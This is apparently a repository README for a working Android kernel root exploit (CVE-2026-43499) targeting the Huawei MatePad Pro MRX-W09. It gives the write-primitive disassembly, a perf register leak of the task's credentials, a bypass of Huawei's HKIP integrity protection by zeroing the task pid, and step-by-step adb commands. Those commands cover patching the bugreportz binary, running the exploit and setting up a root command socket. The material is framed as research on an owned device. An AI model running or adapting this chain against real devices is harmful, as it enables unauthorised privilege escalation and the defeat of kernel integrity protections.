# GhostLock on MRX-W09 — a working root chain for the Huawei MatePad Pro (Kirin 990, EMUI 11, Linux 4.14.116)

Japanese version (default): [README.md](README.md)

Port and endgame for **CVE-2026-43499 ("GhostLock")**, verified end-to-end on a real device.

> **Status: root achieved and verified.**
> `rsh -c id` → `uid=0(root) gid=0(root) … context=u:r:shell:s0`, with a root-owned
> `/data/local/tmp/rooted.txt` and a 4755 root-owned `/data/local/tmp/rsh`.
> The device is a **Huawei MRX-W09** (MatePad Pro 10.8, 2019) on **EMUI 11 / Android 10-based /
> Linux 4.14.116 (Kirin 990, arm64, LTO/CFI, Huawei HKIP enabled)**.

This repository contains the exploit, the enabler, and the full research record (per-device facts,
disassembly-derived struct offsets, and five static-analysis reports).

---

## TL;DR

```text
$ /data/local/tmp/rsh -c id
uid=0(root) gid=0(root) groups=0(root),1004(input),… context=u:r:shell:s0

$ ls -ln /data/local/tmp/
-rw-r--r-- 1 0 2000      67 rooted.txt
-rwsr-xr-x 1 0 2000 4094384 rsh
```

The interesting part is not the memory-corruption bug itself — public PoCs for CVE-2026-43499
already exist — but the **device-specific endgame**:

1. a **perf-based cred leak** that actually works on this LTO/CFI kernel,
2. the **exact store semantics** of the write primitive, proven from disassembly, and
3. **Huawei HKIP**, reverse-engineered from its own kernel source, and the one-line exemption that
   defeats it for a single task (`task_pid_nr(task) == 0`).

---

## 1. Target

| | |
|---|---|
| Device | Huawei **MRX-W09** (MatePad Pro 10.8", 2019) |
| SoC | HiSilicon **Kirin 990** (arm64) |
| Kernel | **Linux 4.14.116**, LTO/CFI, KASLR |
| OS | **EMUI 11** (Android 10) |
| SELinux | Enforcing, no `(allow shell … (capability …))` |
| Extra | **HKIP** (Huawei Kernel Integrity Protection), HHEE/HISEe |

The bootloader is locked and there is **no public unlock** for Kirin 990 (see §8), so a kernel
exploit is the only root path on this device.

---

## 2. The bug (CVE-2026-43499 "GhostLock")

A use-after-free in the futex PI path (`rt_mutex_adjust_prio_chain`) reachable through the
`FUTEX_CMP_REQUEUE_PI` / `pselect6` / IPv4 `MCAST_BLOCK_SOURCE` paths, where a stale `rt_mutex_waiter`
on a kernel stack can be shaped by a syscall's `copy_from_user` (the "stamp") and then erased by
`rb_erase_cached()`. The erase performs a store we control:

```
str x9,  [x8, #8]      ; *((p0 & ~3) + 8) = p1        (the leaf store: an 8-byte 0 when p1 == 0)
str x10, [x9]          ; *(p1) = p0                   (only when p1 != 0)
```

This repository's write primitive is therefore:

| shape | call | effect |
|---|---|---|
| **leaf** | `wi(addr - 8, 0, 0)` | `*(addr) = 0` (8 bytes) |
| **pointer** | `wi(value, target, 0|1)` | `*(target) = value` |

The leaf-store location was **proven by disassembling `rb_erase_cached.cfi`** in the device's own
`vmlinux.elf` (see `docs/static-analysis/TASK_WRITE_SHAPE_20260926.md`). The frequently quoted
`rb_erase_cached.cfi+0x88` is the *other* branch (`p[2] != 0`) and is never taken by this payload.

---

## 3. The endgame chain

```
        ┌── (host) inject the enabler into /system/bin/bugreportz and run it
        │         -> perf_event_paranoid = -1
        ▼
  MAIN ── fork ──> CHILD
                     │
                     │ 1. perf-leak its OWN cred  C  and its task_struct  X
                     │      (sample SyS_setpriority.cfi, read x25 = current->cred)
                     │
   MAIN ─────────────┤ 2. leaf-zero  X + 0x820        <- HKIP pid-0 SHIELD
                     │ 3. leaf-zero  C + 0x04        <- uid+gid = 0
                     │
                     │ 4. setresuid(0,0,0) -> the non-capability fallback passes
                     │      -> commit_creds() -> uid 0, fsuid 0
                     │
                     │ 5. uid 0 + shell domain: writes the proof and serves root commands
                     ▼
             /data/local/tmp/rooted.txt   (written BY uid 0)
             /data/local/tmp/rsh          (4755, owned by root)
             rsh -c id                    -> uid=0(root)
```

### 3.1 The cred leak — `x25` inside `SyS_setpriority.cfi`

`SyS_setpriority` materialises `current->cred` once and keeps it in a callee-saved register:

```asm
ffffff800818e354 <SyS_setpriority.cfi>:
+0x34  mrs  x19, sp_el0            ; x19 = current
+0x38  ldr  w8,  [x19,#1728]
+0x3c  ldr  x25, [x19,#2536]       ; x25 = current->cred   (2536 = 0x9E8)
+0x1f8  adrp x25, …                ; x25 reused here
```

So any sample with `ip ∈ [SyS_setpriority.cfi+0x3c, +0x1f8)` (0x1BC bytes) has
`regs[25] == current->cred`. The exploit runs a 300 000-iteration `setpriority(0,0,-20)` storm and
returns the last `x25` inside that window. (`perf_regs` ordering verified in the kernel tree:
index 25 = `PERF_REG_ARM64_X25`.)

Earlier attempts failed because `security_capable.cfi`'s `x0` is only the cred *at the entry
instruction*, `cap_capable` holds it in `x20`, and an all-register vote is dominated by `current`.

### 3.2 The HKIP bypass (the decisive finding)

Huawei HKIP maintains a per-pid bitmap of "is allowed to be root" bits and kills tasks that look
root-ish without their bit set. From the device kernel source
(`drivers/hisi/hhee/hkip/critdata.c`, `include/linux/hisi/hisi_hkip.h`):

```c
static bool hkip_compute_uid_root(const struct cred *c)
{
    return uid_eq(c->uid,0) || uid_eq(c->euid,0) || uid_eq(c->suid,0) ||
           !cap_isclear(c->cap_inheritable) || !cap_isclear(c->cap_permitted);
}
int hkip_check_uid_root(void)
{
    if (hkip_get_current_bit(hkip_uid_root_bits, /* def_value = */ true))
        return 0;                       /* <-- exempt */
    if (unlikely(hkip_compute_uid_root(creds) || uid_eq(creds->fsuid, 0))) {
        pr_alert("UID root escalation!\n");
        force_sig(SIGKILL, current);    /* <-- the killer */
        return -EPERM;
    }
    return 0;
}
static inline bool hkip_get_task_bit(const u8 *bits, struct task_struct *t, bool def_value)
{
    pid_t pid = task_pid_nr(t);
    if (pid != 0) return hkip_get_bit(bits, pid, PID_MAX_DEFAULT);
    return def_value;                   /* <-- pid 0 => exempt */
}
```

* The check runs from `__cap_capable`, `prepare_creds`, `copy_process` and `acl_permission_check`.
* The bits can only be set by `commit_creds` (`hkip_update_xid_root`) and `fork`
  (`hkip_init_task`) — the bitmaps live in HVC-protected memory.
* **`task_pid_nr(task) == 0` ⇒ `def_value == true` ⇒ every HKIP check returns 0 for that task.**

⇒ Zero `task_struct.pid` (offset `0x820`) **before** making the task root-ish and a single task
becomes a complete, stable HKIP exemption. This is the "pid-0 shield". A pid-0 task must
**never exit** (`kernel/exit.c:786` panics: *"Attempted to kill the idle task!"*), so it parks
forever; `fork()` from it is fine and the child gets a real pid plus its HKIP bit from its now-root
credentials.

### 3.3 Root by the non-capability fallback

SELinux on this policy grants `shell` **no capabilities** (`(allow adbd self (capability (setuid)))`
exists, `shell` is absent), so every `ns_capable(CAP_SETUID)` route is dead. The only path through
`setresuid(0,0,0)` is its **non-capability fallback**:

```c
if (!ns_capable(old->user_ns, CAP_SETUID)) {
    if (ruid != -1 && !uid_eq(kruid, old->uid) && !uid_eq(kruid, old->euid) &&
                      !uid_eq(kruid, old->suid)) goto error;
    …
}
```

so making `old->uid == 0` (the leaf store at `cred+0x04`) is sufficient. `commit_creds()` then gives
`uid 0` and `fsuid = euid = 0` (hence root-owned files), and HKIP's check passes because of the
shield.

### 3.4 Root shell on a `nosuid` `/data`

`/data` is mounted `nosuid`, so a 4755 binary there cannot gain root. Instead the shielded uid-0 task
**serves root commands on an abstract unix socket (`\0gl_su`)**; `rsh` is the same binary in client
mode and forwards `-c CMD`. Each request forks a grandchild, whose `copy_process → hkip_init_task()`
writes its HKIP bit from the root creds (real pid) — a legal root task.

---

## 4. Layout

```
exploit/ghostlock_mrx_e.c   the exploit (single file, many diagnostic modes; the endgame is --simple)
exploit/offset_mrx.h        struct offsets / symbol offsets for this build
enabler/inject_hook.c       host-side enabler injected into /system/bin/bugreportz
docs/FACTS.md               the per-device research log (facts 9an(1)…(133))
docs/HKIP_DECODED_20260922.md
docs/SYMBOLS_20260926.md    ground-truth symbols from the device's own vmlinux.elf
docs/static-analysis/       five disassembly/policy reports (write shape, cred offsets,
                            pid-0 risk, shell capability, file_operations)
```

---

## 5. Build

```sh
aarch64-linux-android24-clang -O2 -static -pthread -o ghostlock_e ghostlock_mrx_e.c
```

(NDK r20b used here.)

## 6. Run

```sh
adb push ghostlock_e /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock_e

# 1) arm and inject the enabler, then trigger it
adb shell /data/local/tmp/inject_hook place 0x84000 0x244 0x7a3d8
adb shell /data/local/tmp/inject_hook hook  0x7a3d4 0x84000
adb shell nohup /system/bin/bugreportz >/dev/null 2>&1 &
adb shell /data/local/tmp/inject_hook restore 0x7a3d4 0xd10403ff
adb shell cat /proc/sys/kernel/perf_event_paranoid      # expect -1

# 2) run the endgame
adb shell nohup /data/local/tmp/ghostlock_e --simple >/dev/null 2>&1 &

# 3) verify
adb shell ls -ln /data/local/tmp/rooted.txt /data/local/tmp/rsh
adb shell /data/local/tmp/rsh -c id
```

---

## 7. Verified result

```
=== /data/local/tmp/rooted.txt ===
=== GHOSTLOCK MRX-W09 rooted ===
uid=0 euid=0 context=u:r:shell:s0

$ /data/local/tmp/rsh -c id
uid=0(root) gid=0(root) groups=0(root),1004(input),… context=u:r:shell:s0

$ ps -A -o PID,UID,NAME | grep ghostlock
 4441     0 ghostlock_e        # the shielded uid-0 task
 4212  2000 ghostlock_e        # the launcher
```

## 8. What this root is **not**

* The bounding set is `0xc0` and the post-`setresuid` cred has **no capabilities**, and the domain
  stays `u:r:shell:s0`. It is **"uid 0 by DAC inside the shell domain"** — not `mount`, not
  `insmod`, not `/dev/block`, not `/system` writes.
* It is **per boot** (the exploit re-runs at every boot). The bootloader is **locked** and there is
  no public Kirin 990 unlock (PotatoNV stops at Kirin 960; the BootROM CVEs were mitigated by an
  eFuse that kills USB Download Mode; the testpoint/board-software method is Kirin 990 **5G**-only
  and the MatePad Pro 2019 board software is not public). A kernel exploit cannot reach the
  bootloader — verified-boot keys and the unlock state live in ROM/eFuse/TEE.
* Raising the privilege further (full capabilities + `mount`) is in progress: the `--cede` path
  (`task->cred = &init_cred` under the pid-0 shield) yields `CAP_FULL_SET` and the kernel SELinux
  domain; the open problem is that the kernel domain denies user file I/O, so the plan is a patched
  policy loaded from the cede'd task (see `docs/FACTS.md` 9an(133)+).

## 9. Credits

* The GhostLock vulnerability and the original PoC family: the upstream authors named in
  `ghostlock_pocs/`.
* The "sample a register that materialises the cred" idea: the **aquos-r6** PoC family.
* Everything under `docs/` was derived from this device's own `vmlinux.elf` and kernel tree.

## 10. Disclaimer

Security research on a device owned by the author, for interoperability and repair purposes.
CVE-2026-43499 is public and many PoCs already exist. Do not use this against devices you do not
own. Provided as-is, no warranty. See [docs/PUBLICATION_REVIEW_ja.md](docs/PUBLICATION_REVIEW_ja.md) for the formal legal notice and disclaimer.

## 11. Persistence

There is **no fully-autonomous re-root** on this device (static survey: no boot-time actor execs from
a writable path; only the `shell` domain may exec `shell_data_file`; setuid is dead because `/data`
is `nosuid`).  `/data` persists, so re-rooting after a reboot is one command:

```sh
adb shell /data/local/tmp/reroot.sh
```

See [docs/static-analysis/TASK_PERSISTENCE_20260926.md](docs/static-analysis/TASK_PERSISTENCE_20260926.md)
and [tools/reroot.sh](tools/reroot.sh).